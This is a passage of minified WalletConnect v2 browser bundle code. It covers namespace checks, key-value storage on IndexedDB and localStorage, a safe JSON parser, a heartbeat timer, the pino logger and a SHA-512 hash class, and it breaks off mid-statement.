${i.toString()}`))})),s.forEach((e=>{n||(Ol(i[e].methods,o[e].methods)?Ol(i[e].events,o[e].events)||(n=je("NON_CONFORMING_NAMESPACES",`${r} namespaces events don't satisfy namespace events for ${e}`)):n=je("NON_CONFORMING_NAMESPACES",`${r} namespaces methods don't satisfy namespace methods for ${e}`))})),n}function zV(e){const t={};return Object.keys(e).forEach((r=>{var n;r.includes(":")?t[r]=e[r]:null==(n=e[r].chains)||n.forEach((n=>{t[n]={methods:e[r].methods,events:e[r].events}}))})),t}function ZE(e){return[...new Set(e.map((e=>e.includes(":")?e.split(":")[0]:e)))]}function HV(e){const t={};return Object.keys(e).forEach((r=>{if(r.includes(":"))t[r]=e[r];else{const n=ch(e[r].accounts);null==n||n.forEach((n=>{t[n]={accounts:e[r].accounts.filter((e=>e.includes(`${n}:`))),methods:e[r].methods,events:e[r].events}}))}})),t}function qV(e,t){return Y3(e,!1)&&e<=t.max&&e>=t.min}function QE(){const e=D0();return new Promise((t=>{switch(e){case os.browser:t(VV());break;case os.reactNative:t(GV());break;case os.node:t(KV());break;default:t(!0)}}))}function VV(){return k0()&&(null==navigator?void 0:navigator.onLine)}async function GV(){if(M0()&&typeof global<"u"&&null!=global&&global.NetInfo){const e=await(null==global?void 0:global.NetInfo.fetch());return null==e?void 0:e.isConnected}return!0}function KV(){return!0}function JV(e){switch(D0()){case os.browser:ZV(e);break;case os.reactNative:QV(e)}}function ZV(e){!M0()&&k0()&&(window.addEventListener("online",(()=>e(!0))),window.addEventListener("offline",(()=>e(!1))))}function QV(e){M0()&&typeof global<"u"&&null!=global&&global.NetInfo&&(null==global||global.NetInfo.addEventListener((t=>e(null==t?void 0:t.isConnected))))}const Iw={};let w1=class{static get(e){return Iw[e]}static set(e,t){Iw[e]=t}static delete(e){delete Iw[e]}};const YV=/"(?:_|\\u0{2}5[Ff]){2}(?:p|\\u0{2}70)(?:r|\\u0{2}72)(?:o|\\u0{2}6[Ff])(?:t|\\u0{2}74)(?:o|\\u0{2}6[Ff])(?:_|\\u0{2}5[Ff]){2}"\s*:/,XV=/"(?:c|\\u0063)(?:o|\\u006[Ff])(?:n|\\u006[Ee])(?:s|\\u0073)(?:t|\\u0074)(?:r|\\u0072)(?:u|\\u0075)(?:c|\\u0063)(?:t|\\u0074)(?:o|\\u006[Ff])(?:r|\\u0072)"\s*:/,eG=/^\s*["[{]|^\s*-?\d{1,16}(\.\d{1,17})?([Ee][+-]?\d+)?\s*$/;function tG(e,t){if(!("__proto__"===e||"constructor"===e&&t&&"object"==typeof t&&"prototype"in t))return t;rG(e)}function rG(e){console.warn(`[destr] Dropping "${e}" key to prevent prototype pollution.`)}function y1(e,t={}){if("string"!=typeof e)return e;const r=e.trim();if('"'===e[0]&&'"'===e.at(-1)&&!e.includes("\\"))return r.slice(1,-1);if(r.length<=9){const e=r.toLowerCase();if("true"===e)return!0;if("false"===e)return!1;if("undefined"===e)return;if("null"===e)return null;if("nan"===e)return Number.NaN;if("infinity"===e)return Number.POSITIVE_INFINITY;if("-infinity"===e)return Number.NEGATIVE_INFINITY}if(!eG.test(e)){if(t.strict)throw new SyntaxError("[destr] Invalid JSON");return e}try{if(YV.test(e)||XV.test(e)){if(t.strict)throw new Error("[destr] Possible prototype pollution");return JSON.parse(e,tG)}return JSON.parse(e)}catch(r){if(t.strict)throw r;return e}}function nG(e){return e&&"function"==typeof e.then?e:Promise.resolve(e)}function Cn(e,...t){try{return nG(e(...t))}catch(e){return Promise.reject(e)}}function iG(e){const t=typeof e;return null===e||"object"!==t&&"function"!==t}function sG(e){const t=Object.getPrototypeOf(e);return!t||t.isPrototypeOf(Object)}function Z1(e){if(iG(e))return String(e);if(sG(e)||Array.isArray(e))return JSON.stringify(e);if("function"==typeof e.toJSON)return Z1(e.toJSON());throw new Error("[unstorage] Cannot stringify value!")}function sI(){if(void 0===typeof Buffer)throw new TypeError("[unstorage] Buffer is not supported!")}const I2="base64:";function oG(e){if("string"==typeof e)return e;sI();const t=Buffer.from(e).toString("base64");return I2+t}function aG(e){return"string"==typeof e&&e.startsWith(I2)?(sI(),Buffer.from(e.slice(I2.length),"base64")):e}function Fi(e){return e?e.split("?")[0].replace(/[/\\]/g,":").replace(/:+/g,":").replace(/^:|:$/g,""):""}function cG(...e){return Fi(e.join(":"))}function _1(e){return(e=Fi(e))?e+":":""}const lG="memory",uG=()=>{const e=new Map;return{name:lG,options:{},hasItem:t=>e.has(t),getItem:t=>e.get(t)||null,getItemRaw:t=>e.get(t)||null,setItem(t,r){e.set(t,r)},setItemRaw(t,r){e.set(t,r)},removeItem(t){e.delete(t)},getKeys:()=>Array.from(e.keys()),clear(){e.clear()},dispose(){e.clear()}}};function fG(e={}){const t={mounts:{"":e.driver||uG()},mountpoints:[""],watching:!1,watchListeners:[],unwatch:{}},r=e=>{for(const r of t.mountpoints)if(e.startsWith(r))return{base:r,relativeKey:e.slice(r.length),driver:t.mounts[r]};return{base:"",relativeKey:e,driver:t.mounts[""]}},n=(e,r)=>t.mountpoints.filter((t=>t.startsWith(e)||r&&e.startsWith(t))).map((r=>({relativeBase:e.length>r.length?e.slice(r.length):void 0,mountpoint:r,driver:t.mounts[r]}))),i=(e,r)=>{if(t.watching){r=Fi(r);for(const n of t.watchListeners)n(e,r)}},o=async()=>{if(t.watching){for(const e in t.unwatch)await t.unwatch[e]();t.unwatch={},t.watching=!1}},s=(e,t,n)=>{const i=new Map,o=e=>{let t=i.get(e.base);return t||(t={driver:e.driver,base:e.base,items:[]},i.set(e.base,t)),t};for(const n of e){const e="string"==typeof n,i=Fi(e?n:n.key),s=e?void 0:n.value,a=e||!n.options?t:{...t,...n.options},c=r(i);o(c).items.push({key:i,value:s,relativeKey:c.relativeKey,options:a})}return Promise.all([...i.values()].map((e=>n(e)))).then((e=>e.flat()))},a={hasItem(e,t={}){e=Fi(e);const{relativeKey:n,driver:i}=r(e);return Cn(i.hasItem,n,t)},getItem(e,t={}){e=Fi(e);const{relativeKey:n,driver:i}=r(e);return Cn(i.getItem,n,t).then((e=>y1(e)))},getItems:(e,t)=>s(e,t,(e=>e.driver.getItems?Cn(e.driver.getItems,e.items.map((e=>({key:e.relativeKey,options:e.options}))),t).then((t=>t.map((t=>({key:cG(e.base,t.key),value:y1(t.value)}))))):Promise.all(e.items.map((t=>Cn(e.driver.getItem,t.relativeKey,t.options).then((e=>({key:t.key,value:y1(e)})))))))),getItemRaw(e,t={}){e=Fi(e);const{relativeKey:n,driver:i}=r(e);return i.getItemRaw?Cn(i.getItemRaw,n,t):Cn(i.getItem,n,t).then((e=>aG(e)))},async setItem(e,t,n={}){if(void 0===t)return a.removeItem(e);e=Fi(e);const{relativeKey:o,driver:s}=r(e);s.setItem&&(await Cn(s.setItem,o,Z1(t),n),s.watch||i("update",e))},async setItems(e,t){await s(e,t,(async e=>{e.driver.setItems&&await Cn(e.driver.setItems,e.items.map((e=>({key:e.relativeKey,value:Z1(e.value),options:e.options}))),t),e.driver.setItem&&await Promise.all(e.items.map((t=>Cn(e.driver.setItem,t.relativeKey,Z1(t.value),t.options))))}))},async setItemRaw(e,t,n={}){if(void 0===t)return a.removeItem(e,n);e=Fi(e);const{relativeKey:o,driver:s}=r(e);if(s.setItemRaw)await Cn(s.setItemRaw,o,t,n);else{if(!s.setItem)return;await Cn(s.setItem,o,oG(t),n)}s.watch||i("update",e)},async removeItem(e,t={}){"boolean"==typeof t&&(t={removeMeta:t}),e=Fi(e);const{relativeKey:n,driver:o}=r(e);o.removeItem&&(await Cn(o.removeItem,n,t),(t.removeMeta||t.removeMata)&&await Cn(o.removeItem,n+"$",t),o.watch||i("remove",e))},async getMeta(e,t={}){"boolean"==typeof t&&(t={nativeOnly:t}),e=Fi(e);const{relativeKey:n,driver:i}=r(e),o=Object.create(null);if(i.getMeta&&Object.assign(o,await Cn(i.getMeta,n,t)),!t.nativeOnly){const e=await Cn(i.getItem,n+"$",t).then((e=>y1(e)));e&&"object"==typeof e&&("string"==typeof e.atime&&(e.atime=new Date(e.atime)),"string"==typeof e.mtime&&(e.mtime=new Date(e.mtime)),Object.assign(o,e))}return o},setMeta(e,t,r={}){return this.setItem(e+"$",t,r)},removeMeta(e,t={}){return this.removeItem(e+"$",t)},async getKeys(e,t={}){e=_1(e);const r=n(e,!0);let i=[];const o=[];for(const e of r){const r=(await Cn(e.driver.getKeys,e.relativeBase,t)).map((t=>e.mountpoint+Fi(t))).filter((e=>!i.some((t=>e.startsWith(t)))));o.push(...r),i=[e.mountpoint,...i.filter((t=>!t.startsWith(e.mountpoint)))]}return e?o.filter((t=>t.startsWith(e)&&!t.endsWith("$"))):o.filter((e=>!e.endsWith("$")))},async clear(e,t={}){e=_1(e),await Promise.all(n(e,!1).map((async e=>{if(e.driver.clear)return Cn(e.driver.clear,e.relativeBase,t);if(e.driver.removeItem){const r=await e.driver.getKeys(e.relativeBase||"",t);return Promise.all(r.map((r=>e.driver.removeItem(r,t))))}})))},async dispose(){await Promise.all(Object.values(t.mounts).map((e=>XE(e))))},watch:async e=>(await(async()=>{if(!t.watching){t.watching=!0;for(const e in t.mounts)t.unwatch[e]=await YE(t.mounts[e],i,e)}})(),t.watchListeners.push(e),async()=>{t.watchListeners=t.watchListeners.filter((t=>t!==e)),0===t.watchListeners.length&&await o()}),async unwatch(){t.watchListeners=[],await o()},mount(e,r){if((e=_1(e))&&t.mounts[e])throw new Error(`already mounted at ${e}`);return e&&(t.mountpoints.push(e),t.mountpoints.sort(((e,t)=>t.length-e.length))),t.mounts[e]=r,t.watching&&Promise.resolve(YE(r,i,e)).then((r=>{t.unwatch[e]=r})).catch(console.error),a},async unmount(e,r=!0){(e=_1(e))&&t.mounts[e]&&(t.watching&&e in t.unwatch&&(t.unwatch[e](),delete t.unwatch[e]),r&&await XE(t.mounts[e]),t.mountpoints=t.mountpoints.filter((t=>t!==e)),delete t.mounts[e])},getMount(e=""){e=Fi(e)+":";const t=r(e);return{driver:t.driver,base:t.base}},getMounts:(e="",t={})=>(e=Fi(e),n(e,t.parents).map((e=>({driver:e.driver,base:e.mountpoint}))))};return a}function YE(e,t,r){return e.watch?e.watch(((e,n)=>t(e,r+n))):()=>{}}async function XE(e){"function"==typeof e.dispose&&await Cn(e.dispose)}function cu(e){return new Promise(((t,r)=>{e.oncomplete=e.onsuccess=()=>t(e.result),e.onabort=e.onerror=()=>r(e.error)}))}function oI(e,t){const r=indexedDB.open(e);r.onupgradeneeded=()=>r.result.createObjectStore(t);const n=cu(r);return(e,r)=>n.then((n=>r(n.transaction(t,e).objectStore(t))))}let Rw;function $0(){return Rw||(Rw=oI("keyval-store","keyval")),Rw}function ex(e,t=$0()){return t("readonly",(t=>cu(t.get(e))))}function hG(e,t,r=$0()){return r("readwrite",(r=>(r.put(t,e),cu(r.transaction))))}function dG(e,t=$0()){return t("readwrite",(t=>(t.delete(e),cu(t.transaction))))}function pG(e=$0()){return e("readwrite",(e=>(e.clear(),cu(e.transaction))))}function gG(e,t){return e.openCursor().onsuccess=function(){this.result&&(t(this.result),this.result.continue())},cu(e.transaction)}function vG(e=$0()){return e("readonly",(e=>{if(e.getAllKeys)return cu(e.getAllKeys());const t=[];return gG(e,(e=>t.push(e.key))).then((()=>t))}))}const mG=e=>JSON.stringify(e,((e,t)=>"bigint"==typeof t?t.toString()+"n":t)),bG=e=>{const t=e.replace(/([\[:])?(\d{17,}|(?:[9](?:[1-9]07199254740991|0[1-9]7199254740991|00[8-9]199254740991|007[2-9]99254740991|007199[3-9]54740991|0071992[6-9]4740991|00719925[5-9]740991|007199254[8-9]40991|0071992547[5-9]0991|00719925474[1-9]991|00719925474099[2-9])))([,\}\]])/g,'$1"$2n"$3');return JSON.parse(t,((e,t)=>"string"==typeof t&&t.match(/^\d+n$/)?BigInt(t.substring(0,t.length-1)):t))};function L0(e){if("string"!=typeof e)throw new Error("Cannot safe json parse value of type "+typeof e);try{return bG(e)}catch{return e}}function ql(e){return"string"==typeof e?e:mG(e)||""}const wG="idb-keyval";var yG=(e={})=>{const t=e.base&&e.base.length>0?`${e.base}:`:"",r=e=>t+e;let n;return e.dbName&&e.storeName&&(n=oI(e.dbName,e.storeName)),{name:wG,options:e,hasItem:async e=>!(typeof await ex(r(e),n)>"u"),getItem:async e=>await ex(r(e),n)??null,setItem:(e,t)=>hG(r(e),t,n),removeItem:e=>dG(r(e),n),getKeys:()=>vG(n),clear:()=>pG(n)}};const _G="WALLET_CONNECT_V2_INDEXED_DB",EG="keyvaluestorage";let xG=class{constructor(){this.indexedDb=fG({driver:yG({dbName:_G,storeName:EG})})}async getKeys(){return this.indexedDb.getKeys()}async getEntries(){return(await this.indexedDb.getItems(await this.indexedDb.getKeys())).map((e=>[e.key,e.value]))}async getItem(e){const t=await this.indexedDb.getItem(e);if(null!==t)return t}async setItem(e,t){await this.indexedDb.setItem(e,ql(t))}async removeItem(e){await this.indexedDb.removeItem(e)}};var Tw=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{},Q1={exports:{}};function SG(e){var t;return[e[0],L0(null!=(t=e[1])?t:"")]}!function(){let e;function t(){}e=t,e.prototype.getItem=function(e){return this.hasOwnProperty(e)?String(this[e]):null},e.prototype.setItem=function(e,t){this[e]=String(t)},e.prototype.removeItem=function(e){delete this[e]},e.prototype.clear=function(){const e=this;Object.keys(e).forEach((function(t){e[t]=void 0,delete e[t]}))},e.prototype.key=function(e){return e=e||0,Object.keys(this)[e]},e.prototype.__defineGetter__("length",(function(){return Object.keys(this).length})),typeof Tw<"u"&&Tw.localStorage?Q1.exports=Tw.localStorage:typeof window<"u"&&window.localStorage?Q1.exports=window.localStorage:Q1.exports=new t}();let CG=class{constructor(){this.localStorage=Q1.exports}async getKeys(){return Object.keys(this.localStorage)}async getEntries(){return Object.entries(this.localStorage).map(SG)}async getItem(e){const t=this.localStorage.getItem(e);if(null!==t)return L0(t)}async setItem(e,t){this.localStorage.setItem(e,ql(t))}async removeItem(e){this.localStorage.removeItem(e)}};const AG="wc_storage_version",tx=1,IG=async(e,t,r)=>{const n=AG,i=await t.getItem(n);if(i&&i>=1)return void r(t);const o=await e.getKeys();if(!o.length)return void r(t);const s=[];for(;o.length;){const r=o.shift();if(!r)continue;const n=r.toLowerCase();if(n.includes("wc@")||n.includes("walletconnect")||n.includes("wc_")||n.includes("wallet_connect")){const n=await e.getItem(r);await t.setItem(r,n),s.push(r)}}await t.setItem(n,1),r(t),RG(e,s)},RG=async(e,t)=>{t.length&&t.forEach((async t=>{await e.removeItem(t)}))};let TG=class{constructor(){this.initialized=!1,this.setInitialized=e=>{this.storage=e,this.initialized=!0};const e=new CG;this.storage=e;try{const t=new xG;IG(e,t,this.setInitialized)}catch{this.initialized=!0}}async getKeys(){return await this.initialize(),this.storage.getKeys()}async getEntries(){return await this.initialize(),this.storage.getEntries()}async getItem(e){return await this.initialize(),this.storage.getItem(e)}async setItem(e,t){return await this.initialize(),this.storage.setItem(e,t)}async removeItem(e){return await this.initialize(),this.storage.removeItem(e)}async initialize(){this.initialized||await new Promise((e=>{const t=setInterval((()=>{this.initialized&&(clearInterval(t),e())}),20)}))}};var lh={},Xh={},Nw={},ed={};let lu=class{};const NG=Object.freeze(Object.defineProperty({__proto__:null,IEvents:lu},Symbol.toStringTag,{value:"Module"})),OG=sa(NG);var rx,nx;function PG(){if(rx)return ed;rx=1,Object.defineProperty(ed,"__esModule",{value:!0}),ed.IHeartBeat=void 0;const e=OG;class t extends e.IEvents{constructor(e){super()}}return ed.IHeartBeat=t,ed}function aI(){return nx||(nx=1,function(e){Object.defineProperty(e,"__esModule",{value:!0}),ca.__exportStar(PG(),e)}(Nw)),Nw}var ix,sx,ox,Ow={},wl={};function MG(){if(ix)return wl;ix=1,Object.defineProperty(wl,"__esModule",{value:!0}),wl.HEARTBEAT_EVENTS=wl.HEARTBEAT_INTERVAL=void 0;const e=rt;return wl.HEARTBEAT_INTERVAL=e.FIVE_SECONDS,wl.HEARTBEAT_EVENTS={pulse:"heartbeat_pulse"},wl}function cI(){return sx||(sx=1,function(e){Object.defineProperty(e,"__esModule",{value:!0}),ca.__exportStar(MG(),e)}(Ow)),Ow}function kG(){if(ox)return Xh;ox=1,Object.defineProperty(Xh,"__esModule",{value:!0}),Xh.HeartBeat=void 0;const e=ca,t=ai,r=rt,n=aI(),i=cI();class o extends n.IHeartBeat{constructor(e){super(e),this.events=new t.EventEmitter,this.interval=i.HEARTBEAT_INTERVAL,this.interval=(null==e?void 0:e.interval)||i.HEARTBEAT_INTERVAL}static init(t){return e.__awaiter(this,void 0,void 0,(function*(){const e=new o(t);return yield e.init(),e}))}init(){return e.__awaiter(this,void 0,void 0,(function*(){yield this.initialize()}))}stop(){clearInterval(this.intervalRef)}on(e,t){this.events.on(e,t)}once(e,t){this.events.once(e,t)}off(e,t){this.events.off(e,t)}removeListener(e,t){this.events.removeListener(e,t)}initialize(){return e.__awaiter(this,void 0,void 0,(function*(){this.intervalRef=setInterval((()=>this.pulse()),r.toMiliseconds(this.interval))}))}pulse(){this.events.emit(i.HEARTBEAT_EVENTS.pulse)}}return Xh.HeartBeat=o,Xh}!function(e){Object.defineProperty(e,"__esModule",{value:!0});const t=ca;t.__exportStar(kG(),e),t.__exportStar(aI(),e),t.__exportStar(cI(),e)}(lh);var Pw,ax,Mw,cx,nr={};function DG(){if(ax)return Pw;function e(e){try{return JSON.stringify(e)}catch{return'"[Circular]"'}}return ax=1,Pw=function(t,r,n){var i=n&&n.stringify||e;if("object"==typeof t&&null!==t){var o=r.length+1;if(1===o)return t;var s=new Array(o);s[0]=i(t);for(var a=1;a<o;a++)s[a]=i(r[a]);return s.join(" ")}if("string"!=typeof t)return t;var c=r.length;if(0===c)return t;for(var l="",u=0,h=-1,d=t&&t.length||0,f=0;f<d;){if(37===t.charCodeAt(f)&&f+1<d){switch(h=h>-1?h:0,t.charCodeAt(f+1)){case 100:case 102:if(u>=c||null==r[u])break;h<f&&(l+=t.slice(h,f)),l+=Number(r[u]),h=f+2,f++;break;case 105:if(u>=c||null==r[u])break;h<f&&(l+=t.slice(h,f)),l+=Math.floor(Number(r[u])),h=f+2,f++;break;case 79:case 111:case 106:if(u>=c||void 0===r[u])break;h<f&&(l+=t.slice(h,f));var p=typeof r[u];if("string"===p){l+="'"+r[u]+"'",h=f+2,f++;break}if("function"===p){l+=r[u].name||"<anonymous>",h=f+2,f++;break}l+=i(r[u]),h=f+2,f++;break;case 115:if(u>=c)break;h<f&&(l+=t.slice(h,f)),l+=String(r[u]),h=f+2,f++;break;case 37:h<f&&(l+=t.slice(h,f)),l+="%",h=f+2,f++,u--}++u}++f}return-1===h?t:(h<d&&(l+=t.slice(h)),l)},Pw}function $G(){if(cx)return Mw;cx=1;const e=DG();Mw=n;const t=function(){function e(e){return typeof e<"u"&&e}try{return typeof globalThis<"u"||Object.defineProperty(Object.prototype,"globalThis",{get:function(){return delete Object.prototype.globalThis,this.globalThis=this},configurable:!0}),globalThis}catch{return e(self)||e(window)||e(this)||{}}}().console||{},r={mapHttpRequest:l,mapHttpResponse:l,wrapRequestSerializer:u,wrapResponseSerializer:u,wrapErrorSerializer:u,req:l,res:l,err:function(e){const t={type:e.constructor.name,msg:e.message,stack:e.stack};for(const r in e)void 0===t[r]&&(t[r]=e[r]);return t}};function n(e){(e=e||{}).browser=e.browser||{};const r=e.browser.transmit;if(r&&"function"!=typeof r.send)throw Error("pino: transmit option must have a send function");const l=e.browser.write||t;e.browser.write&&(e.browser.asObject=!0);const u=e.serializers||{},d=function(e,t){return Array.isArray(e)?e.filter((function(e){return"!stdSerializers.err"!==e})):!0===e&&Object.keys(t)}(e.browser.serialize,u);let f=e.browser.serialize;Array.isArray(e.browser.serialize)&&e.browser.serialize.indexOf("!stdSerializers.err")>-1&&(f=!1);"function"==typeof l&&(l.error=l.fatal=l.warn=l.info=l.debug=l.trace=l),!1===e.enabled&&(e.level="silent");const p=e.level||"info",g=Object.create(l);g.log||(g.log=h),Object.defineProperty(g,"levelVal",{get:function(){return"silent"===this.level?1/0:this.levels.values[this.level]}}),Object.defineProperty(g,"level",{get:function(){return this._level},set:function(e){if("silent"!==e&&!this.levels.values[e])throw Error("unknown level "+e);this._level=e,i(m,g,"error","log"),i(m,g,"fatal","error"),i(m,g,"warn","error"),i(m,g,"info","log"),i(m,g,"debug","log"),i(m,g,"trace","log")}});const m={transmit:r,serialize:d,asObject:e.browser.asObject,levels:["error","fatal","warn","info","debug","trace"],timestamp:c(e)};return g.levels=n.levels,g.level=p,g.setMaxListeners=g.getMaxListeners=g.emit=g.addListener=g.on=g.prependListener=g.once=g.prependOnceListener=g.removeListener=g.removeAllListeners=g.listeners=g.listenerCount=g.eventNames=g.write=g.flush=h,g.serializers=u,g._serialize=d,g._stdErrSerialize=f,g.child=function(t,n){if(!t)throw new Error("missing bindings for child Pino");n=n||{},d&&t.serializers&&(n.serializers=t.serializers);const i=n.serializers;if(d&&i){var c=Object.assign({},u,i),l=!0===e.browser.serialize?Object.keys(c):d;delete t.serializers,o([t],l,c,this._stdErrSerialize)}function h(e){this._childLevel=1+(0|e._childLevel),this.error=s(e,t,"error"),this.fatal=s(e,t,"fatal"),this.warn=s(e,t,"warn"),this.info=s(e,t,"info"),this.debug=s(e,t,"debug"),this.trace=s(e,t,"trace"),c&&(this.serializers=c,this._serialize=l),r&&(this._logEvent=a([].concat(e._logEvent.bindings,t)))}return h.prototype=this,new h(this)},r&&(g._logEvent=a()),g}function i(r,i,s,c){const l=Object.getPrototypeOf(i);i[s]=i.levelVal>i.levels.values[s]?h:l[s]?l[s]:t[s]||t[c]||h,function(r,i,s){!r.transmit&&i[s]===h||(i[s]=function(c){return function(){const l=r.timestamp(),u=new Array(arguments.length),h=Object.getPrototypeOf&&Object.getPrototypeOf(this)===t?t:this;for(var d=0;d<u.length;d++)u[d]=arguments[d];if(r.serialize&&!r.asObject&&o(u,this._serialize,this.serializers,this._stdErrSerialize),r.asObject?c.call(h,function(t,r,i,s){t._serialize&&o(i,t._serialize,t.serializers,t._stdErrSerialize);const a=i.slice();let c=a[0];const l={};s&&(l.time=s),l.level=n.levels.values[r];let u=1+(0|t._childLevel);if(u<1&&(u=1),null!==c&&"object"==typeof c){for(;u--&&"object"==typeof a[0];)Object.assign(l,a.shift());c=a.length?e(a.shift(),a):void 0}else"string"==typeof c&&(c=e(a.shift(),a));return void 0!==c&&(l.msg=c),l}(this,s,u,l)):c.apply(h,u),r.transmit){const e=r.transmit.level||i.level,t=n.levels.values[e],c=n.levels.values[s];if(c<t)return;!function(e,t,r){const n=t.send,i=t.ts,s=t.methodLevel,c=t.methodValue,l=t.val,u=e._logEvent.bindings;o(r,e._serialize||Object.keys(e.serializers),e.serializers,void 0===e._stdErrSerialize||e._stdErrSerialize),e._logEvent.ts=i,e._logEvent.messages=r.filter((function(e){return-1===u.indexOf(e)})),e._logEvent.level.label=s,e._logEvent.level.value=c,n(s,e._logEvent,l),e._logEvent=a(u)}(this,{ts:l,methodLevel:s,methodValue:c,transmitLevel:e,transmitValue:n.levels.values[r.transmit.level||i.level],send:r.transmit.send,val:i.levelVal},u)}}}(i[s]))}(r,i,s)}function o(e,t,r,i){for(const o in e)if(i&&e[o]instanceof Error)e[o]=n.stdSerializers.err(e[o]);else if("object"==typeof e[o]&&!Array.isArray(e[o]))for(const n in e[o])t&&t.indexOf(n)>-1&&n in r&&(e[o][n]=r[n](e[o][n]))}function s(e,t,r){return function(){const n=new Array(1+arguments.length);n[0]=t;for(var i=1;i<n.length;i++)n[i]=arguments[i-1];return e[r].apply(this,n)}}function a(e){return{ts:0,messages:[],bindings:e||[],level:{label:"",value:0}}}function c(e){return"function"==typeof e.timestamp?e.timestamp:!1===e.timestamp?d:f}function l(){return{}}function u(e){return e}function h(){}function d(){return!1}function f(){return Date.now()}return n.levels={values:{fatal:60,error:50,warn:40,info:30,debug:20,trace:10},labels:{10:"trace",20:"debug",30:"info",40:"warn",50:"error",60:"fatal"}},n.stdSerializers=r,n.stdTimeFunctions=Object.assign({},{nullTime:d,epochTime:f,unixTime:function(){return Math.round(Date.now()/1e3)},isoTime:function(){return new Date(Date.now()).toISOString()}}),Mw}var lx,yl={};function lI(){return lx||(lx=1,Object.defineProperty(yl,"__esModule",{value:!0}),yl.PINO_CUSTOM_CONTEXT_KEY=yl.PINO_LOGGER_DEFAULTS=void 0,yl.PINO_LOGGER_DEFAULTS={level:"info"},yl.PINO_CUSTOM_CONTEXT_KEY="custom_context"),yl}var ux,pi={};function LG(){if(ux)return pi;ux=1,Object.defineProperty(pi,"__esModule",{value:!0}),pi.generateChildLogger=pi.formatChildLoggerContext=pi.getLoggerContext=pi.setBrowserLoggerContext=pi.getBrowserLoggerContext=pi.getDefaultLoggerOptions=void 0;const e=lI();function t(t,r=e.PINO_CUSTOM_CONTEXT_KEY){return t[r]||""}function r(t,r,n=e.PINO_CUSTOM_CONTEXT_KEY){return t[n]=r,t}function n(r,n=e.PINO_CUSTOM_CONTEXT_KEY){let i="";return i=typeof r.bindings>"u"?t(r,n):r.bindings().context||"",i}function i(t,r,i=e.PINO_CUSTOM_CONTEXT_KEY){const o=n(t,i);return o.trim()?`${o}/${r}`:r}return pi.getDefaultLoggerOptions=function(t){return Object.assign(Object.assign({},t),{level:(null==t?void 0:t.level)||e.PINO_LOGGER_DEFAULTS.level})},pi.getBrowserLoggerContext=t,pi.setBrowserLoggerContext=r,pi.getLoggerContext=n,pi.formatChildLoggerContext=i,pi.generateChildLogger=function(t,n,o=e.PINO_CUSTOM_CONTEXT_KEY){const s=i(t,n,o);return r(t.child({context:s}),s,o)},pi}!function(e){Object.defineProperty(e,"__esModule",{value:!0}),e.pino=void 0;const t=ca,r=t.__importDefault($G());Object.defineProperty(e,"pino",{enumerable:!0,get:function(){return r.default}}),t.__exportStar(lI(),e),t.__exportStar(LG(),e)}(nr);let BG=class extends lu{constructor(e){super(),this.opts=e,this.protocol="wc",this.version=2}},FG=class extends lu{constructor(e,t){super(),this.core=e,this.logger=t,this.records=new Map}},jG=class{constructor(e,t){this.logger=e,this.core=t}},UG=class extends lu{constructor(e,t){super(),this.relayer=e,this.logger=t}},WG=class extends lu{constructor(e){super()}},zG=class{constructor(e,t,r,n){this.core=e,this.logger=t,this.name=r}},HG=class extends lu{constructor(e,t){super(),this.relayer=e,this.logger=t}},qG=class extends lu{constructor(e,t){super(),this.core=e,this.logger=t}},VG=class{constructor(e,t){this.projectId=e,this.logger=t}},GG=class{constructor(e){this.opts=e,this.protocol="wc",this.version=2}},KG=class{constructor(e){this.client=e}};var X3={},uI={};!function(e){Object.defineProperty(e,"__esModule",{value:!0});var t=Dt,r=fs;e.DIGEST_LENGTH=64,e.BLOCK_SIZE=128;var n=function(){function n(){this.digestLength=e.DIGEST_LENGTH,this.blockSize=e.BLOCK_SIZE,this._stateHi=new Int32Array(8),this._stateLo=new Int32Array(8),this._tempHi=new Int32Array(16),this._tempLo=new Int32Array(16),this._buffer=new Uint8Array(256),this._bufferLength=0,this._bytesHashed=0,this._finished=!1,this.reset()}return n.prototype._initState=function(){this._stateHi[0]=1779033703,this._stateHi[1]=3144134277,this._stateHi[2]=1013904242,this._stateHi[3]=2773480762,this._stateHi[4]=1359893119,this._stateHi[5]=2600822924,this._stateHi[6]=528734635,this._stateHi[7]=1541459225,this._stateLo[0]=4089235720,this._stateLo[1]=2227873595,this._stateLo[2]=4271175723,this._stateLo[3]=1595750129,this._stateLo[4]=2917565137,this._stateLo[5]=725511199,this._stateLo[6]=4215389547,this._stateLo[7]=327033209},n.prototype.reset=function(){return this._initState(),this._bufferLength=0,this._bytesHashed=0,this._finished=!1,this},n.prototype.clean=function(){r.wipe(this._buffer),r.wipe(this._tempHi),r.wipe(this._tempLo),this.reset()},n.prototype.update=function(t,r){if(void 0===r&&(r=t.length),this._finished)throw new Error("SHA512: can't update because hash was finished.");var n=0;if(this._bytesHashed+=r,this._bufferLength>0){for(;this._bufferLength<e.BLOCK_SIZE&&r>0;)this._buffer[this._bufferLength++]=t[n++],r--;this._bufferLength===this.blockSize&&(o(this._tempHi,this._tempLo,this._stateHi,this._stateLo,this._buffer,0,this.blockSize),this._bufferLength=0)}for(r>=this.blockSize&&(n=o(this._tempHi,this._tempLo,this._stateHi,this._stateLo,t,n,r),r%=this.blockSize);r>0;)this._buffer[this._bufferLength++]=t[n++],r--;return this},n.prototype.finish=function(e){if(!this._finished){var r=this._bytesHashed,n=this._bufferLength,i=r/536870912|0,s=r<<3,a=r%128<112?128:256;this._buffer[n]=128;for(var c=n+1;c<a-8;c++)this._buffer[c]=0;t.writeUint32BE(i,this._buffer,a-8),t.writeUint32BE(s,this._buffer,a-4),o(this._tempHi,this._tempLo,this._stateHi,this._stateLo,this._buffer,0,a),this._finished=!0}for(c=0;c<this.digestLength/8;c++)t.writeUint32BE(this._stateHi[c],e,8*c),t.writeUint32BE(this._stateLo[c],e,8*c+4);return this},n.prototype.digest=function(){var e=new Uint8Array(this.digestLength);return this.finish(e),e},n.prototype.saveState=function(){if(this._finished)throw new Error("SHA256: cannot save finished state");return{stateHi:new Int32Array(this._stateHi),stateLo:new Int32Array(this._stateLo),buffer:this._bufferLength>0?new Uint8Array(this._buffer):void 0,bufferLength:this._bufferLength,bytesHashed:this._bytesHashed}},n.prototype.restoreState=function(e){return this._stateHi.set(e.stateHi),this._stateLo.set(e.stateLo),this._bufferLength=e.bufferLength,e.buffer&&this._buffer.set(e.buffer),this._bytesHashed=e.bytesHashed,this._finished=!1,this},n.prototype.cleanSavedState=function(e){r.wipe(e.stateHi),r.wipe(e.stateLo),e.buffer&&r.wipe(e.buffer),e.bufferLength=0,e.bytesHashed=0},n}();e.SHA512=n;var i=new 